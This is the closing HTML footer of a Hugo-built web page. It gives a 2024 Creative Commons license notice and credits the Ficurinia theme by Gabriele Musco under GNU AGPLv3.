        2024 &copy; Licensed under <a href="https://creativecommons.org/licenses/by-nc/4.0/">Creative Commons Attribution 4.0 International License</a>.
    </small></p>
    <p><small>
        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
    </small></p>
</footer>
</div>
            </div>
        </div>


</body>
</html>
